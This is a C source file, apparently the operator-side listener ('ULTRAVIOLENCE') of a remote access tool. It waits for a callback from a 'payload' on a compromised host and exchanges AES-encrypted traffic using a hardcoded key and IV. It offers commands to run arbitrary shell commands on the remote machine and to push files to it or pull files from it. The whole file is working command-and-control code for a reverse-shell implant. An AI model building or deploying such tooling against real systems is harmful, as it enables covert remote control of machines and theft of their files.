#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <netdb.h> 
#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <sys/socket.h> 
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/types.h>
#define MAX 2048 
#define MAX_ENC 2064
#define SA struct sockaddr 

unsigned char *key = (unsigned char *)"kXMYK0nLhhqkCRwTbg5Fhvok2ANsTiWV";
unsigned char *iv = (unsigned char *)"5SmGalZA9FZJ7cij";

void handleErrors(void)
{
    ERR_print_errors_fp(stderr);
    abort();
}

int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,
            unsigned char *iv, unsigned char *ciphertext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int ciphertext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the encryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be encrypted, and obtain the encrypted output.
     * EVP_EncryptUpdate can be called multiple times if necessary
     */
    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        handleErrors();
    ciphertext_len = len;

    /*
     * Finalise the encryption. Further ciphertext bytes may be written at
     * this stage.
     */
    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
        handleErrors();
    ciphertext_len += len;
    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return ciphertext_len;
}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
            unsigned char *iv, unsigned char *plaintext)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    int plaintext_len;

    /* Create and initialise the context */
    if(!(ctx = EVP_CIPHER_CTX_new()))
        handleErrors();

    /*
     * Initialise the decryption operation. IMPORTANT - ensure you use a key
     * and IV size appropriate for your cipher
     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
     * IV size for *most* modes is the same as the block size. For AES this
     * is 128 bits
     */
    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        handleErrors();

    /*
     * Provide the message to be decrypted, and obtain the plaintext output.
     * EVP_DecryptUpdate can be called multiple times if necessary.
     */
    if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
        handleErrors();
    plaintext_len = len;

    /*
     * Finalise the decryption. Further plaintext bytes may be written at
     * this stage.
     */
    if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
        handleErrors();
    plaintext_len += len;

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;
}


void func(int sockfd) 
{ 
    	unsigned char buff[MAX];
	unsigned char enc_buff[MAX_ENC]; 
	int n;
	printf("\nFor help menu use #help\n\n");
    	for (;;) { 
        	bzero(buff, MAX);
		bzero(enc_buff, MAX_ENC); 
		read(sockfd, enc_buff, MAX_ENC);
		decrypt(enc_buff, MAX_ENC, key, iv, buff);
		strtok(buff, "\n");	
        	printf("%s>", buff); 
        	n = 0; 
		bzero(buff, MAX);
		bzero(enc_buff, MAX);
        	while ((buff[n++] = getchar()) != '\n')
			;
		if(strncmp(buff, "#help", 5) == 0)
		{
			printf("\n\n#cd <dir> -- to change working directory\n");
			printf("#put <source> <destination> -- to put source file on client to destination on payload\n");
			printf("#get <source> <destination> -- to get source file from payload to destination on client\n");
			printf("#exit -- to end connection and to gracefully end payload\n");
			printf("To execute system commands on payload just type commands EX: cat /etc/resolv.conf\n\n\n");
			bzero(buff, MAX);
			bzero(enc_buff, MAX_ENC);
			strcpy(buff, "#DONOTHING");
			encrypt(buff, MAX, key, iv, enc_buff);
			write(sockfd, enc_buff, MAX_ENC);
			bzero(buff, MAX);
			bzero(enc_buff, MAX_ENC);
			read(sockfd, enc_buff, MAX_ENC);
			bzero(buff, 2048);
			bzero(enc_buff, MAX_ENC);
		}
		else if(strncmp(buff, "#put", 4) == 0)
		{
			char * put_file;
			char * source_dest;
			FILE * put_file_to_read;
			long int fsize;
			char cfsize[50];
			int count = 0;
			int check = 0;
			char fileend[]={"#FILEEND"};
			bzero(cfsize, 50);
			put_file=strtok(buff, " ");
			put_file=strtok(NULL, " ");
			source_dest=strtok(NULL, "\n");
			put_file_to_read = fopen(put_file, "r");
			if(put_file_to_read == NULL)
			{
				printf("Could not open file!\n");
				bzero(buff, MAX);
				bzero(enc_buff, MAX_ENC);
				strcpy(buff, "#DONOTHING");
				encrypt(buff, MAX, key, iv, enc_buff);
				write(sockfd, enc_buff, MAX_ENC);
			}
			else{
				strcat(buff, " ");
				strcat(buff, source_dest);
				fseek(put_file_to_read, 0, SEEK_END);
				fsize = ftell(put_file_to_read);
				rewind(put_file_to_read);
				fseek(put_file_to_read, 0, SEEK_SET);
				sprintf(cfsize, "%ld", fsize);
				strcat(buff, " ");
				strcat(buff, cfsize);
				bzero(enc_buff, MAX_ENC);
				encrypt(buff, MAX, key, iv, enc_buff);
				write(sockfd, enc_buff, MAX_ENC);
				count = 0;
				bzero(buff, 2048);
				bzero(enc_buff, MAX_ENC);
				check = ftell(put_file_to_read);
				read(sockfd, enc_buff, MAX_ENC);
				decrypt(enc_buff, MAX_ENC, key, iv, buff);
				if(strncmp(buff, "#failed", 7) == 0)
				{
					printf("%s\n", buff);
				} 
				else if(strncmp(buff, "#transfer", 9) == 0)
				{ 
					bzero(buff, MAX);
					bzero(enc_buff, MAX_ENC);
					while(1){
						usleep(1);
						if((count+MAX)<fsize)
						{	
							fread(buff, sizeof(char), MAX, put_file_to_read);
							encrypt(buff, MAX, key, iv, enc_buff);
							write(sockfd, enc_buff, MAX_ENC);
							bzero(buff, MAX);
							bzero(enc_buff, MAX_ENC);
							count += MAX;
						}
						else
						{
							fread(buff, sizeof(char), (fsize-count), put_file_to_read);
							encrypt(buff, MAX, key, iv, enc_buff);
							write(sockfd, enc_buff, MAX_ENC);
							bzero(buff, MAX);
							bzero(enc_buff, MAX_ENC);
							break;
						}
					}
					strcpy(buff, fileend);
					encrypt(buff, MAX, key, iv, enc_buff);
					write(sockfd, enc_buff, MAX_ENC);
					fclose(put_file_to_read);
				}
			}
			bzero(buff, MAX);
			bzero(enc_buff, MAX_ENC);
			read(sockfd, enc_buff, MAX_ENC);
			decrypt(enc_buff, MAX_ENC, key, iv, buff);
			if(strncmp(buff, "#BUFFEREND", 10) == 0)
			{

			}
		}
		else if(strncmp(buff, "#get", 4)==0)
		{
			char * get_file;
			char get_file_stored[255];
			char * get_file_dest;
			FILE * get_file_destp;
			char * get_file_clength;
			long int get_file_length;
			int count = 0;
			get_file = strtok(buff, " ");
			get_file = strtok(NULL, " ");
			strcpy(get_file_stored, get_file);
			get_file_dest = strtok(NULL, "\n");
			get_file_destp = fopen(get_file_dest, "w");
			if(get_file_destp == NULL)
			{
				printf("Failed to open file location\n");
				perror("ERROR:");
				bzero(buff, MAX);
				bzero(enc_buff, MAX_ENC);
				strcpy(buff, "#DONOTHING");
				encrypt(buff, MAX, key, iv, enc_buff);
				write(sockfd, enc_buff, MAX_ENC);
			}
			else{
				strcat(buff, " ");
				strcat(buff, get_file_stored);
				strcat(buff, "\n");
				encrypt(buff, MAX, key, iv, enc_buff);
				write(sockfd, enc_buff, MAX_ENC);
				bzero(buff, MAX);
				bzero(enc_buff, MAX_ENC);
				read(sockfd, enc_buff, MAX_ENC);
				decrypt(enc_buff, MAX_ENC, key, iv, buff);
				if(strncmp(buff, "#failed", 7) == 0)
				{
					printf("%s", buff);
				}
				else{
					get_file_clength = strtok(buff, "\n");
					get_file_length = atol(get_file_clength);
					while(1)
					{
						usleep(1);
						bzero(buff, MAX);
						bzero(enc_buff, MAX_ENC);
						read(sockfd, enc_buff, MAX_ENC);
						decrypt(enc_buff, MAX_ENC, key, iv, buff);
						if(strncmp(buff, "#FILEEND", 8) == 0)
						{
							bzero(buff, MAX);
							bzero(enc_buff, MAX_ENC);
							break;
						}
						else
						{
							if((count+MAX)<get_file_length)
							{
								fwrite(buff, sizeof(char), MAX, get_file_destp);
								count += 2048;
							}
							else
							{
								fwrite(buff, sizeof(char), (get_file_length-count), get_file_destp);
							}
						}
					}
				}
				fclose(get_file_destp);	
				printf("Got File!\n");
			}
			bzero(buff, MAX);
			bzero(enc_buff, MAX_ENC);
			read(sockfd, enc_buff, MAX_ENC);
			decrypt(enc_buff, MAX_ENC, key, iv, buff);
			if(strncmp(buff, "#BUFFEREND", 10) == 0)
			{
			}	
		} 
		else{
			encrypt(buff, MAX, key, iv, enc_buff);
        		write(sockfd, enc_buff, MAX_ENC); 
        		bzero(buff, MAX);
			bzero(enc_buff, MAX_ENC);
        		read(sockfd, enc_buff, MAX_ENC);
			decrypt(enc_buff, MAX_ENC, key, iv, buff);
			if(strncmp(buff, "Error", 5) ==0)
			{
        			printf("%s", buff);
			}
			else if(strncmp(buff, "Payload is closing#bye", 22) == 0)
			{
				break;
			}
			else if(strncmp(buff, "#BUFFEREND", 10) == 0)
			{

			} 
			else
			{	
			/*for(int z = 0; z <2048; z++)
			{
				printf("%c", buff[z]);
			}*/
				printf("%s", buff);
				while(1)
				{
					bzero(buff, MAX);
					bzero(enc_buff, MAX_ENC);
					read(sockfd, enc_buff, MAX_ENC);
					decrypt(enc_buff, MAX_ENC, key, iv, buff);
					if (strncmp(buff, "#BUFFEREND", 10) == 0)
					{
						break;
					}
					else{
					/*for(int y = 0; y < 2048; y++)
					{
						printf("%c", buff[y]);
					}*/
						printf("%s", buff);
					}
					usleep(1);
				}
			}
    		}
	} 
} 
  
int main(int argc, char * argv[]) 
{
	if (argc != 2)
	{
		printf("No port to listen on!\n");
		printf("ULTRAVIOLENCE <port to listen for callback>\n");
		exit(0);
	}
	if(strncmp(argv[1], "--help", 6) == 0 | strncmp(argv[1], "-h", 2) == 0)
	{
		printf("ULTRAVIOLENCE <port to listen for callback>\n");
		exit(0);
	}
	int port = atoi(argv[1]);
	int sockfd, connfd, len;
        struct sockaddr_in servaddr, cli;

    // socket create and verification 
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd == -1) {
                printf("socket creation failed...\n");
                exit(0);
        }
        else
                printf("Socket successfully created..\n");
        bzero(&servaddr, sizeof(servaddr));

    // assign IP, PORT 
        servaddr.sin_family = AF_INET;
        servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
        servaddr.sin_port = htons(port);

    // Binding newly created socket to given IP and verification 
        if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) {
                printf("socket bind failed...\n");
                exit(0);
        }
        else
                printf("Socket successfully binded..\n");

    // Now server is ready to listen and verification 
        if ((listen(sockfd, 5)) != 0) {
                printf("Listen failed...\n");
                exit(0);
        }
        else
                printf("ULTRAVIOLENCE listening..\n");
        len = sizeof(cli);

    // Accept the data packet from client and verification 
        connfd = accept(sockfd, (SA*)&cli, &len);
        if (connfd < 0) {
                printf("ULTRAVIOLENCE acccept failed...\n");
                exit(0);
        }
        else
                printf("ULTRAVIOLENCE acccepted the client...\n");

    // Function for chatting between client and server 
        func(connfd);

    // After chatting close the socket 
        close(sockfd);
 
	return 0;
} 

